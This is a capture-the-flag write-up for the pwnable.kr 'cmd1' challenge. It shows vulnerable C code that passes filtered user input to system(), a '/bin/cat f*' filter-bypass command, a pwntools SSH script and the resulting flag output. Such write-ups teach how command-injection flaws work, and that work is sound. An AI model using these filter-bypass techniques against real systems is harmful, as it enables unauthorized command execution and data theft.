#Pwnable.kr: Toddler's Bottle
##cmd1

For this challenge we just need to bypass a simple filter in order to print out the flag. The source code is shown below and shows that the filter only just checks for the strings *"flag"*, *"sh"*, and *"tmp"* within our input argument then if the filter does not catch anything passes our argument to *system( argv[1] )*.

*cmd1.c*
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

Of note, the *cat* command is not filtered out and the *flag* file is the only file within the directory that starts with f. However, since the *PATH* environment variable is changed before calling *system()*, we will have to directly specify the location of the *cat* program, which is usually located at */bin/cat*. Therefore we can just run the following command and get our flag.

```bash
./cmd1 '/bin/cat f*'
```

We can write up a nice little python script to do this for us.

```python
from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='cmd1', password='guest')
p = s.process(["./cmd1", "/bin/cat f*"])
print(p.recvline())
```
Taa daa! We got the flag!

```
[+] Connecting to pwnable.kr on port 2222: Done
[*] cmd1@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process './cmd1' on pwnable.kr: pid 226542
mommy now I get what PATH environment is for :)
```

Just another classic reminder of never letting users have direct input to executing shell commands.
